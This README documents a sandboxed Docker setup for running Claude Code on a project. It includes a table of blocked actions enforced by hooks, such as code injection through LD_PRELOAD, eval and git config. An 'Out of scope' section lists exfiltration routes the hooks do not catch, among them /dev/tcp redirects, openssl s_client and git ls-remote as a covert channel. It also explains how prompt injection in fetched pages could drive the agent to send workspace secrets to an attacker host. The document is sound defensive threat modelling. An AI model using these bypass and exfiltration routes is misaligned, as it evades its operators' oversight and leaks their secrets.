# Claude Code — [PROJECT NAME]

Runs Claude Code in a sandboxed container with access to the
[PROJECT NAME] codebase. Opt-in — does not start with the normal
application stack.

## Prerequisites

- Docker and Docker Compose
- Access to the GitLab container registry:
  `docker login registry.example.com`

## First-Time Setup

### 1. Start the container

From `docker/claude/`:

```bash
docker compose up -d
```

From the project root:

```bash
docker compose -f docker/claude/docker-compose.yml up -d
```

### 2. Enter the container and log in

From `docker/claude/`:

```bash
docker compose exec claude bash
claude login
```

From the project root:

```bash
docker compose -f docker/claude/docker-compose.yml exec claude bash
claude login
```

This only needs to happen once. Credentials persist in the
`claude-dev-state` Docker volume across container restarts and rebuilds.

### 3. Context7 API key (optional)

The bundled `context7` MCP server (library docs search) works without
any setup, but the anonymous tier is rate-limited **per IP** (200
requests/month at time of writing) — an office behind one NAT shares
a single bucket. For real usage, each developer sets a free personal
key:

1. Get a key at <https://context7.com/dashboard> (starts with
   `ctx7sk-`).
2. Copy `.env` to `docker/claude/.env` (same directory as the
   compose file) and fill in `CONTEXT7_API_KEY=ctx7sk-…`.
3. Add `docker/claude/.env` to your project's `.gitignore` — **never
   commit a real key.**
4. Restart the container (`docker compose up -d`). Key rotation is the
   same: edit the file, restart.

The file lives on the host in your project tree, so it survives
`docker compose down -v` (which wipes the dev-state volume). Inside
the container the `docker/` directory is masked, so Claude never sees
the file itself — but the env var *is* readable in-session, which is
why this should be a free personal key, not a shared or paid org key.

## Daily Use

Start the container if it's not running:

From `docker/claude/`:

```bash
docker compose up -d
```

From the project root:

```bash
docker compose -f docker/claude/docker-compose.yml up -d
```

Enter it:

From `docker/claude/`:

```bash
docker compose exec claude bash
```

From the project root:

```bash
docker compose -f docker/claude/docker-compose.yml exec claude bash
```

Start a Claude session:

```bash
claude
```

When you're done, just `exit` the bash shell. The container stays
running in the background.

To stop the container when you don't need it:

From `docker/claude/`:

```bash
docker compose stop
```

From the project root:

```bash
docker compose -f docker/claude/docker-compose.yml stop
```

## What Claude Can and Can't Do

Claude runs inside a sandbox. The defaults are intentionally strict —
the assumption is that anything Claude reads from the web (papers,
docs, repos) could try to inject instructions, so the model's
*capabilities* are clipped even though its *content access* isn't.

### Allowed

- Read and edit files under `/workspace` (subject to the file-access
  rules below).
- Read most of the filesystem (`/etc`, `/usr`, etc. — for inspection only).
- Reach the internet via `WebFetch` and `WebSearch`, under Claude
  Code's normal permission settings (no sandbox hook forces a prompt).
- Run any non-restricted shell command (`ls`, `cat`, `grep`, `rg`,
  `find`, `sed`, `awk`, etc.; `rg`/ripgrep is bundled and preferred
  over `grep` for code search — **recursive** `grep -r` is hook-blocked
  to enforce that, but non-recursive grep on a file, piped grep, and
  `git grep` still work). Note: you cannot ask Claude to *run* scripts
  with `bash`, `sh`, `source`, etc. — only inspect them.
- Extract text from a **local PDF** with `pdftotext file.pdf -`
  (poppler-utils, bundled; local, no network) — greppable text for long
  PDFs, and cheaper than the Read tool's page-image rendering. Returns
  empty on scanned/image-only PDFs; Read (vision) handles those.
- Run **read-only git commands**: `status`, `log`, `diff`, `show`,
  `blame`, `grep`, branch/tag listing, `config --get`, `remote -v`,
  `stash list`, etc.
- Query the bundled `codebase-memory` MCP server (`search_graph`,
  `get_code_snippet`, `query_graph`, `search_code`, etc.). The
  `/workspace` index is seeded on first container start. Treat MCP
  query results as attacker-influenceable — they replay indexed file
  contents (comments, docstrings) verbatim.
- Query the bundled `context7` MCP server for up-to-date docs on any
  library or framework (Vue, React, generic JS/TS, …):
  `resolve-library-id` (find a library's Context7 ID) and `query-docs`
  (fetch docs/code examples for it). Tool names match Context7's
  upstream MCP. Works without setup on a shared anonymous tier; set a
  personal API key for real limits — see "Context7 API key (optional)"
  below. Same attacker-influenceable caution applies to returned docs
  text.

### Blocked (enforced by hooks)

No env-var escape hatches. If a blocked action is genuinely needed,
run it yourself outside Claude — your shell isn't constrained by
Claude Code hooks.

| Action | Hook |
|---|---|
| `python` / `python3` / `pip` invocation | `block-restricted-tools.sh` |
| `chmod` (any) | `block-restricted-tools.sh` |
| Recursive `grep` (`grep`/`egrep`/`fgrep` with `-r`/`-R`/`--recursive`) — tool-preference nudge to the Grep tool / `rg`; non-recursive grep on a file, piped grep, and `git grep` stay allowed | `block-restricted-tools.sh` |
| Command-wrapper utilities: `eval`, `exec`, `env`, `nohup`, `xargs` (would otherwise bypass python/chmod/direct-exec blocks; matched in command position and quote-aware — the same word inside a quoted search pattern like `rg "(a\|env\|b)"` is fine, while a `bash -c`/`eval` payload or `$(…)` stays scanned) | `block-restricted-tools.sh` |
| `find … -exec`/`-execdir` into a shell, wrapper, or writable-path target (`-exec sh -c …`, `-exec /tmp/payload …`) — per-match arbitrary exec. Benign filters (`-exec grep … {} +`) stay allowed | `block-restricted-tools.sh` |
| Sensitive inline env-var assignment prefixing a command: `LD_PRELOAD=`, `LD_AUDIT=`, `DYLD_*=`, `BASH_ENV=`, `GIT_*=`, `PATH=`, `NODE_OPTIONS=`, `PAGER=`, etc. (code injection / sandbox bypass). Harmless prefixes like `NODE_ENV=test` and `make CC=gcc` are unaffected | `block-restricted-tools.sh` |
| Direct execution of any file under a writable path (`./run`, `/home/claude/x`, `/workspace/build`, `/tmp/payload`, `/var/tmp/payload`) | `block-restricted-tools.sh` |
| Running a script via an interpreter (`bash file.sh`, `sh ./run`, `source x`, `. x`, `... \| bash`, `bash < file`) | `block-restricted-tools.sh` |
| git write commands (`add`, `commit`, `push`, `pull`, `fetch`, `merge`, `rebase`, `reset`, `checkout`, `restore`, `revert`, `clean`, branch/tag delete, `stash push`, remote add, etc.) — incl. behind global flags (`git -C dir push`) | `block-git-writes.sh` |
| git config injection (`git -c key=val …`, `--config-env`) and the `ext::` remote helper — turn an allowed git read into code execution | `block-git-writes.sh` |
| Editing linter/formatter/typechecker config (`tsconfig.json`, `.eslintrc`, `mypy.ini`, etc.) | `config-protection.sh` |
| Writing common secret patterns (API keys, tokens, private keys) | `secret-scan.sh` (auto-exempt: test/fixture paths — `tests/`, `test/`, `__tests__/`, `fixtures/` — and `*.example` files; elsewhere a per-line `secret-scan-ignore` comment for legitimate fixtures) |
| `codebase-memory` MCP destructive tools: `delete_project`, `ingest_traces`, `manage_adr` | `permissions.deny` in managed settings |
| `ScheduleWakeup` (self-paced `/loop`) and `ShareOnboardingGuide` (external guide publishing) | `permissions.deny` in managed settings |
| `codebase-memory` MCP `index_repository` with `repo_path` outside `/workspace` (e.g. `/home/claude`, `/etc`) | `restrict-cbm-index.py` |
| Re-reading the *same* file (>8 KB) identically (same range) when it hasn't changed on disk — token optimisation, not a security block; read a sub-range or change the file to re-read | `dedup-reads.sh` (reset on `clear`/`compact` by `reset-read-dedup.sh`) |

> Claude **can** freely write scripts (including ones with shebangs) —
> writing code is part of the job. What it cannot do is *run* those
> scripts inside the session. If something needs to be run, run it
> yourself.

### Blocked (enforced by container)

- Modifying anything outside `/workspace` / `/home/claude` / `/tmp` /
  `/var/tmp` — root filesystem is read-only.
- Installing system packages — no root, no sudo, no apt.
- Running your project: no `php`/`composer`, no `node`/`npm`/`yarn`/
  `pnpm`, no `make` — the image ships no project runtimes at all
  (`command not found`). Claude writes code; you run, build, and test
  it outside the container.
- Privilege escalation — all Linux capabilities dropped,
  `no-new-privileges` set.
- Mounting filesystems, raw sockets, fork bombs — capability and
  resource limits.
- Self-updating Claude Code — `DISABLE_AUTOUPDATER=1`; updates land
  via `docker compose pull`.
- Auto memory — `CLAUDE_CODE_DISABLE_AUTO_MEMORY=1`; Claude neither
  saves memories nor loads earlier ones. Put durable personal
  instructions in `.claude-local/CLAUDE.md` instead.
- `codebase-memory-mcp` phone-home / self-update — the runtime image
  has no `curl` or `wget` (the pinned binary's update path is a `curl`
  shell-out to `api.github.com`), and `CBM_DOWNLOAD_URL` points at a dead
  loopback as belt-and-braces, so the update check can't reach the
  network either way.

### Not blocked (be aware)

- `WebFetch` reaches any URL. **Prompt injection in fetched content is
  the most realistic attack vector against this sandbox.** Treat
  anything in `/workspace` after a session like a PR from an untrusted
  contributor: review before merging.
- Indirect execution patterns like `eval "$(cat file)"` are not caught
  by the interpreter-block hook (best-effort regex, not a full bash
  parser). Exotic but possible.
- The `context7` MCP tools GET queries and library names to
  `context7.com` without a per-call prompt — that lookup is their
  function. The destination is hardcoded; no other host is reachable
  through it. If you
  set `CONTEXT7_API_KEY`, that value is visible to Claude in-session
  (it's in the container environment) — use a free personal key, never
  a shared or paid org key.

### Out of scope: outbound data exfiltration

The sandbox does **not** supervise *what Claude sends out*. Plain `Bash` can speak TCP via paths the hooks
don't catch:

- `bash -c 'exec 3<>/dev/tcp/host/port; …'` — bash's built-in TCP
  redirect, allowed because `bash -c "<string>"` is allowed
- `openssl s_client -connect host:port` — generic TLS client, allowed
- `git ls-remote https://host/$encoded-data` — request URL doubles
  as a covert channel, allowed (git reads are allowed)
- any future networking tool added to the image

These are *allowed by design* — the network stays open so Claude can
read documentation. The implication: if Claude ingests adversarial
content (a fetched page, a malicious file in `/workspace`, a PR
description), an embedded prompt-injection payload can instruct it to
POST sensitive `/workspace` contents to an attacker-controlled host
through a single `Bash` call. No per-call approval prompt would fire.

What that means in practice:

- **Mask sensitive files at the mount layer**, not by relying on
  Claude to ignore them. The `/dev/null:/workspace/.env:ro` pattern
  in the compose file is the right shape; extend it for any path
  containing credentials, tokens, db dumps, etc.
- **Review `Bash` calls during a session** the same way you'd review
  a PR. A `Bash` call to a hostname you don't recognise is the signal.
- **Don't run Claude against repos containing live secrets in
  unmasked paths.** If a contributor's draft branch has a real token
  in `config/local.example.yml`, Claude will read it; if Claude is
  then prompt-injected, the token can leave.

If your threat model includes attacker-controlled content + sensitive
secrets in `/workspace`, an open network is the wrong posture and you
want an egress allowlist (forward proxy or `network_mode: none` plus
a managed proxy) instead of this image's defaults.

## File Access

### Read-write (Claude can read and edit)

The entire project is mounted at `/workspace`, except for the
overrides listed below.

### Read-only (Claude can read, not edit)

| Path | Reason |
|------|--------|
| `vendor/` | Dependencies — install via package manager, not Claude |
| `node_modules/` | Dependencies — install via package manager, not Claude |

### Hidden (masked, Claude sees an empty file)

| Path | Reason |
|------|--------|
| `.env` | Contains secrets |

### Hidden (masked, Claude sees an empty directory)

| Path | Reason |
|------|--------|
| `docker/` | Infrastructure config |

## Skills

The image ships a set of **skills** — guided workflows and on-demand
reference packs Claude can use on request. They're optional: normal coding
works without ever invoking one. Trigger a skill by typing its slash
command (e.g. `/grill-me`) at the start of a turn, or just describe the intent
("grill me on this plan") and Claude picks the matching one. Exceptions:
`/wayfinder` and `/wait-what` only start by their explicit slash
commands — Claude never auto-invokes them.

| Skill | What it does | Reach for it when… |
|---|---|---|
| `/grill-me` | Interviews you relentlessly about a plan or design, resolving each branch of the decision tree until you share an understanding. | you want a plan stress-tested before committing to it. |
| `/grill-with-docs` | Like `/grill-me`, but challenges the plan against your project's documented domain model and updates `CONTEXT.md` / ADRs inline as decisions settle. | the project already has documented decisions and shared terminology to defend. |
| `/domain-modeling` | Builds and sharpens the project's domain model — pins down terminology (ubiquitous language) and records architectural decisions. | you want the project's vocabulary or a decision written down so future sessions share it. |
| `/codebase-design` | Shared vocabulary for designing deep modules — interfaces, seams, testability. | designing or improving a module's interface, or deciding where a seam goes. |
| `/prototype` | Builds a throwaway prototype to answer a design question — state model, logic, or rough UI. | you want to sanity-check whether a design feels right before committing to it. |
| `/research` | Spins up a background agent that investigates a question against primary sources and writes a cited markdown file to `.claude-local/research/`. | you want docs or API facts gathered while you keep working. |
| `/diagnosing-bugs` | Diagnosis discipline for hard bugs and performance regressions — hypothesis-driven, evidence before fixes. | something is broken, throwing, failing, or slow and the cause isn't obvious. |
| `/resolving-merge-conflicts` | Guides resolution of an in-progress merge/rebase conflict. | git stopped mid-merge or mid-rebase with conflict markers. |
| `/to-spec` | Turns the conversation into a session-spanning spec both you and Claude can refer back to later. | the work is large enough to outlive one session and you don't want to re-explain it next time. |
| `/to-issues` | Breaks a plan, spec, or PRD into independently-grabbable issues as tracer-bullet vertical slices. | you've agreed on a plan and want it sliced into tickets for your tracker. |
| `/wayfinder` | Charts a big, foggy effort as a local map of decision tickets (`.claude-local/wayfinder/`), then resolves them one per session until the way is clear. Paste or describe your JIRA ticket to start — no tracker access needed. | the work is too big for one session and the route to the goal isn't visible yet. |
| `/wait-what` | Interjection: stops the flow and makes Claude re-pitch its last message — brief context, simplified technical English, the project's own terms. | Claude's last explanation didn't land. |
| `/writing-for-agents` | Reference for writing documents agents consume — skills, `CLAUDE.md`/`AGENTS.md`, docs behind pointers: context pointers, progressive disclosure, completion criteria, leading words, pruning. | creating or editing a skill or agent instruction file. |
| `/handoff` | Compacts the current conversation into a handoff document for the next session or another developer to pick up. | a session is ending mid-task and context needs to survive. |
| `/improve-codebase-architecture` | Hunts for refactoring / deepening opportunities, informed by `CONTEXT.md` and `docs/adr/`. Produces a markdown report. | you want the codebase made more testable, navigable, or less tightly coupled. |
| `/codebase-memory` | Reference for the bundled codebase-memory knowledge-graph MCP — call-chain tracing, symbol search, architecture / dead-code audits, Cypher queries. | exploring an unfamiliar codebase or tracing call paths and impact, beyond plain text search. |
| `/project-rules` | Records a committed, path-scoped rule in your project's `.claude/rules/` (`paths:` frontmatter) — Claude Code loads it natively whenever a matching file is read or edited, for every teammate after they pull. Routes the rule to the right area file, dedupes globs, flags rules-that-apply-everywhere as `CLAUDE.md` candidates. | you want a decision or convention recorded for the whole team, not just your own Claude memory. |
| `/infer-conventions` | Bootstraps project rules from an existing codebase: sweeps convention dimensions (validation, controllers, models, testing, …), records only evidence-backed non-default patterns (≥3 instances, no counterexamples) after your per-rule approval, and reports genuinely mixed patterns as a decision work-list instead of recording them. Explicit invocation only. | adopting project rules in a codebase that already has years of implicit conventions. |

Several of these write their output to `.claude-local/` rather than the
repo — see below.

## Customizing Rules (Project & Personal)

Claude's behaviour comes from three rule tiers. When they conflict, the
most specific wins: **personal > project > image defaults**.
(Precedence is advisory — Claude reconciles the loaded text; it is not
hard-enforced.)

| Tier | Where you put it | Shared via | When it loads |
|---|---|---|---|
| **Image defaults** | shipped in the image | — | always; nothing to do |
| **Project** | `CLAUDE.md` at your repo root, and `.claude/rules/*.md` | committed to your repo (everyone on the project gets it) | `CLAUDE.md` always; a `rules/` file with a `paths:` frontmatter loads only when Claude touches a matching file |
| **Personal** | `.claude-local/CLAUDE.md` | gitignored — yours alone | every session |

- **Project rules** use Claude Code's native conventions — no extra
  setup. Drop a `CLAUDE.md` at your repo root for always-on project
  guidance, and add `.claude/rules/<topic>.md` files for scoped rules.
  Scope a rule to specific files with `paths:` frontmatter, e.g.:

  ```md
  ---
  paths:
    - "**/*.vue"
  ---

  # Vue conventions
  ...
  ```

- **Personal rules** go in `.claude-local/CLAUDE.md`. This file is
  gitignored, so it never ships and never reaches your teammates — it's
  your own local steering ("always run the linter before tests", "I
  prefer X over Y"). It is loaded into every session as the
  highest-precedence tier. Personal rules are always-on; there is no
  `paths:` scoping at this tier (scope-by-file is a project concern, so
  it lives in committed `.claude/rules/`).

## Skill Scratch Files (`.claude-local/`)

Several skills (`handoff`, `to-spec`, `to-issues`, `wayfinder`,
`research`, `prototype`, `improve-codebase-architecture`) write
personal markdown artifacts to
`.claude-local/<skill>/` inside your project. These are Claude↔developer
working notes — handoff snapshots, draft specs, issue-tree drafts,
architecture reports. They're not meant to be shared via git.

`.claude-local/` also holds one *hand-authored* file:
`.claude-local/CLAUDE.md`, your personal instructions (see *Customizing
Rules* above). Generated or hand-authored, all of `.claude-local/` is
personal and gitignored.

Add the directory to your project's `.gitignore`:

```
.claude-local/
```

If you want to share something (a spec, an issue tree), copy the
relevant file into a tracker, doc, or chat manually. Nothing in
`.claude-local/` should end up in a commit.

## Updating the Claude Image

From `docker/claude/`:

```bash
docker compose pull
docker compose up -d
```

From the project root:

```bash
docker compose -f docker/claude/docker-compose.yml pull
docker compose -f docker/claude/docker-compose.yml up -d
```

The first command pulls the latest image. The second recreates the
container with the new image. Credentials and session history are
preserved — they live in the `claude-dev-state` Docker volume.

## Resetting Developer State

If you hit auth issues or corrupted state, stop the container and
wipe the volume:

```bash
docker compose -f docker/claude/docker-compose.yml down -v
docker compose -f docker/claude/docker-compose.yml up -d
```

You will need to run `claude login` again.

> Note: `down -v` deletes the `claude-dev-state` volume. Plain
> `down` (without `-v`) keeps it.
